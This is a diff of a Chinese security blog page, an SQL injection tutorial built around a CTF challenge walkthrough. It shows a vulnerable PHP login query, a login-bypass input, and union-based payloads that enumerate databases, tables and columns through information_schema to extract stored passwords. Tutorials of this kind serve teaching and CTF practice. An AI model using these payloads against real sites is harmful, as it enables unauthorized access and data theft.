@@ -27,22 +27,22 @@
 <meta property="og:site_name" content="su29029的博客">
 <meta property="og:description" content="sql注入是个很复杂的东西，这里分多篇来总结一些常见的注入姿势。">
 <meta property="og:locale">
-<meta property="og:image" content="https://su29029.github.io/assets/img/sql注入总结（一）/sql注入总结（一）1.jpg">
-<meta property="og:image" content="https://su29029.github.io/assets/img/sql注入总结（一）/sql注入总结（一）2.jpg">
-<meta property="og:image" content="https://su29029.github.io/assets/img/sql注入总结（一）/sql注入总结（一）3.jpg">
-<meta property="og:image" content="https://su29029.github.io/assets/img/sql注入总结（一）/sql注入总结（一）4.jpg">
-<meta property="og:image" content="https://su29029.github.io/assets/img/sql注入总结（一）/sql注入总结（一）5.jpg">
-<meta property="og:image" content="https://su29029.github.io/assets/img/sql注入总结（一）/sql注入总结（一）6.jpg">
-<meta property="og:image" content="https://su29029.github.io/assets/img/sql注入总结（一）/sql注入总结（一）7.jpg">
-<meta property="og:image" content="https://su29029.github.io/assets/img/sql注入总结（一）/sql注入总结（一）8.jpg">
-<meta property="og:image" content="https://su29029.github.io/assets/img/sql注入总结（一）/sql注入总结（一）9.jpg">
-<meta property="og:image" content="https://su29029.github.io/assets/img/sql注入总结（一）/sql注入总结（一）10.jpg">
+<meta property="og:image" content="https://su29029.github.io/images/img/sql注入总结（一）/sql注入总结（一）1.jpg">
+<meta property="og:image" content="https://su29029.github.io/images/img/sql注入总结（一）/sql注入总结（一）2.jpg">
+<meta property="og:image" content="https://su29029.github.io/images/img/sql注入总结（一）/sql注入总结（一）3.jpg">
+<meta property="og:image" content="https://su29029.github.io/images/img/sql注入总结（一）/sql注入总结（一）4.jpg">
+<meta property="og:image" content="https://su29029.github.io/images/img/sql注入总结（一）/sql注入总结（一）5.jpg">
+<meta property="og:image" content="https://su29029.github.io/images/img/sql注入总结（一）/sql注入总结（一）6.jpg">
+<meta property="og:image" content="https://su29029.github.io/images/img/sql注入总结（一）/sql注入总结（一）7.jpg">
+<meta property="og:image" content="https://su29029.github.io/images/img/sql注入总结（一）/sql注入总结（一）8.jpg">
+<meta property="og:image" content="https://su29029.github.io/images/img/sql注入总结（一）/sql注入总结（一）9.jpg">
+<meta property="og:image" content="https://su29029.github.io/images/img/sql注入总结（一）/sql注入总结（一）10.jpg">
 <meta property="article:published_time" content="2020-08-28T02:34:54.000Z">
-<meta property="article:modified_time" content="2020-08-28T07:32:45.062Z">
+<meta property="article:modified_time" content="2020-08-28T09:06:53.776Z">
 <meta property="article:author" content="su29029">
 <meta property="article:tag" content="web安全">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://su29029.github.io/assets/img/sql注入总结（一）/sql注入总结（一）1.jpg">
+<meta name="twitter:image" content="https://su29029.github.io/images/img/sql注入总结（一）/sql注入总结（一）1.jpg">
 
 <link rel="canonical" href="https://su29029.github.io/2020/08/28/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%EF%BC%88%E4%B8%80%EF%BC%89/">
 
@@ -182,7 +182,7 @@
     <link itemprop="mainEntityOfPage" href="https://su29029.github.io/2020/08/28/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%EF%BC%88%E4%B8%80%EF%BC%89/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="image" content="/images/avatar.jpg">
       <meta itemprop="name" content="su29029">
       <meta itemprop="description" content="因为心在那里">
     </span>
@@ -203,7 +203,7 @@
               <span class="post-meta-item-text">Posted on</span>
               
 
-              <time title="Created: 2020-08-28 10:34:54 / Modified: 15:32:45" itemprop="dateCreated datePublished" datetime="2020-08-28T10:34:54+08:00">2020-08-28</time>
+              <time title="Created: 2020-08-28 10:34:54 / Modified: 17:06:53" itemprop="dateCreated datePublished" datetime="2020-08-28T10:34:54+08:00">2020-08-28</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -262,32 +262,32 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$username &#x3D; $_GET[&#39;username&#39;];</span><br><span class="line">$password &#x3D; $_GET[&#39;password&#39;];</span><br><span class="line">$query &#x3D; &quot;SELECT * FROM users WHERE username&#x3D;&#39;&quot; . $id . &quot;&#39;and password&#x3D;&#39;&quot; . $password . &quot;&#39;&quot;;</span><br></pre></td></tr></table></figure>
 <p>首先我们知道<code>#</code>和<code>--</code>是sql语句中的注释，其中<code>--</code>后面需要加一个空格。这里我们巧妙构造输入<code>/?username=admin%27%20or%201=1%20%23</code>，这时sql语句变为<code>&quot;SELECT * FROM users WHERE username=&#39;admin&#39; or 1=1 #and password=&#39;&#39;&quot;</code>从而<code>and password=&#39;&#39;</code>这部分内容被注释掉了，sql语句永远为真，造成sql注入。   </p>
 <h2 id="0x03-联合查询注入"><a href="#0x03-联合查询注入" class="headerlink" title="0x03 联合查询注入"></a>0x03 联合查询注入</h2><p>联合查询注入是一种常用的注入方式，它借助的是大于等于5.0版本的MySQL中的<code>information_schema</code>数据库，<code>information_schema</code>数据库中存储了MySQL服务器所维护的其他所有数据库的信息。例如数据库名，数据表名，列名，列的数据类型等。这时通过<code>union</code>关键字进行联合查询即可查询到大量信息。   </p>
-<p>举个简单的题目的例子，2019极客大挑战的一道sql注入题。(复现环境<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges">https://buuoj.cn/challenges</a>)<br>拿到题目，使用<code>1&#39;</code>登录，发现sql报错，故存在注入点。<br><img src="/assets/img/sql注入总结（一）/sql注入总结（一）1.jpg"><br><img src="/assets/img/sql注入总结（一）/sql注入总结（一）2.jpg"><br>这里首先尝试万能密码登录，<code>/check.php?username=admin%27%20%23&amp;password=123</code>，发现成功登录，显示了登录用户名和一串密码。<br><img src="/assets/img/sql注入总结（一）/sql注入总结（一）3.jpg"><br>将第一个查询字段的<code>admin</code>置为一个不存在的值[不这么做的话会无法显示union select查询出的值]，然后判断列数，发现共计3列，尝试第四列则报错。  </p>
+<p>举个简单的题目的例子，2019极客大挑战的一道sql注入题。(复现环境<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges">https://buuoj.cn/challenges</a>)<br>拿到题目，使用<code>1&#39;</code>登录，发现sql报错，故存在注入点。<br><img src="/images/img/sql注入总结（一）/sql注入总结（一）1.jpg"><br><img src="/images/img/sql注入总结（一）/sql注入总结（一）2.jpg"><br>这里首先尝试万能密码登录，<code>/check.php?username=admin%27%20%23&amp;password=123</code>，发现成功登录，显示了登录用户名和一串密码。<br><img src="/images/img/sql注入总结（一）/sql注入总结（一）3.jpg"><br>将第一个查询字段的<code>admin</code>置为一个不存在的值[不这么做的话会无法显示union select查询出的值]，然后判断列数，发现共计3列，尝试第四列则报错。  </p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;check.php?username&#x3D;admn%27%20order%20by%1,2,3%23&amp;password&#x3D;123</span><br></pre></td></tr></table></figure>
-<img src="/assets/img/sql注入总结（一）/sql注入总结（一）4.jpg">   
+<img src="/images/img/sql注入总结（一）/sql注入总结（一）4.jpg">   
 
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;check.php?username&#x3D;admn%27%20order%20by1,2,3,4%23&amp;password&#x3D;123</span><br></pre></td></tr></table></figure>
-<img src="/assets/img/sql注入总结（一）/sql注入总结（一）5.jpg">   
+<img src="/images/img/sql注入总结（一）/sql注入总结（一）5.jpg">   
 
 <p>判断一下列名对应的内容：  </p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;check.php?username&#x3D;admn%27%20union%20select%201,2,3%23&amp;password&#x3D;123</span><br></pre></td></tr></table></figure>
-<img src="/assets/img/sql注入总结（一）/sql注入总结（一）6.jpg">   
+<img src="/images/img/sql注入总结（一）/sql注入总结（一）6.jpg">   
 
 <p>发现第二列对应username，第三列对应password。<br>下面开始union select注入。首先查数据库名。数据库名对应的是<code>information_schema.schemata</code>数据表，这里面存储的是所有数据库的信息。    </p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;check.php?username&#x3D;admn%27%20union%20select%201,(select%20group_concat(schema_name)%20from%20information_schema.schemata),3%23&amp;password&#x3D;123</span><br></pre></td></tr></table></figure>
-<img src="/assets/img/sql注入总结（一）/sql注入总结（一）7.jpg">    
+<img src="/images/img/sql注入总结（一）/sql注入总结（一）7.jpg">    
 
 <p>下一步查询数据表，所有数据表名信息存储在<code>information_schema.tables</code>数据表中。例如查询geek数据库的数据表名：   </p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;check.php?username&#x3D;admn%27%20union%20select%201,(select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema&#x3D;&quot;geek&quot;),3%23&amp;password&#x3D;123</span><br></pre></td></tr></table></figure>
-<img src="/assets/img/sql注入总结（一）/sql注入总结（一）8.jpg">   
+<img src="/images/img/sql注入总结（一）/sql注入总结（一）8.jpg">   
 
 <p>下一步查询列名，所有列名信息存储在<code>information_schema.columns</code>数据表中。例如查询l0ve1ysq1表中的所有列名：  </p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;check.php?username&#x3D;admn%27%20union%20select%201,(select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_schema&#x3D;&quot;geek&quot;%20and%20table_name&#x3D;&quot;l0ve1ysq1&quot;),3%23&amp;password&#x3D;123</span><br></pre></td></tr></table></figure>
-<img src="/assets/img/sql注入总结（一）/sql注入总结（一）9.jpg">   
+<img src="/images/img/sql注入总结（一）/sql注入总结（一）9.jpg">   
 最后通过limit限制行数一行一行查询表中的内容，最终得到flag。  
 
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;check.php?username&#x3D;admn%27%20union%20select%201,(select%20password%20from%20geek.l0ve1ysq1%20limit%2015,1),3%23&amp;password&#x3D;123</span><br></pre></td></tr></table></figure>
-<img src="/assets/img/sql注入总结（一）/sql注入总结（一）10.jpg">   
+<img src="/images/img/sql注入总结（一）/sql注入总结（一）10.jpg">   
 
 <h2 id="0x04-堆叠注入"><a href="#0x04-堆叠注入" class="headerlink" title="0x04 堆叠注入"></a>0x04 堆叠注入</h2><p>堆叠注入指的是在某些情况下，后端的sql语句执行函数可以执行多条命令(例如mysqli_multi_query())，这个时候我们可以通过<code>;</code>来结束前一条sql语句，随后再在分号后面写入sql，从而实现“堆一堆”sql语句进行注入。而<code>;</code>后的语句理论上没有过滤的话则可以为所欲为。<br>不过堆叠注入利用的条件有限，因为一般情况下后台的sql执行函数为安全起见只允许执行单一sql，分号后的语句将会被忽略。  </p>
 <h2 id="0x05-报错注入"><a href="#0x05-报错注入" class="headerlink" title="0x05 报错注入"></a>0x05 报错注入</h2><p>报错注入一般应用在正确执行无回显，而若发生错误会显示错误的情况下。这时可以使用报错注入的方式获得数据库信息。<br>报错注入常用函数：   </p>
@@ -387,6 +387,8 @@
 
       <div class="site-overview-wrap sidebar-panel">
         <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="su29029"
+      src="/images/avatar.jpg">
   <p class="site-author-name" itemprop="name">su29029</p>
   <div class="site-description" itemprop="description">因为心在那里</div>
 </div>
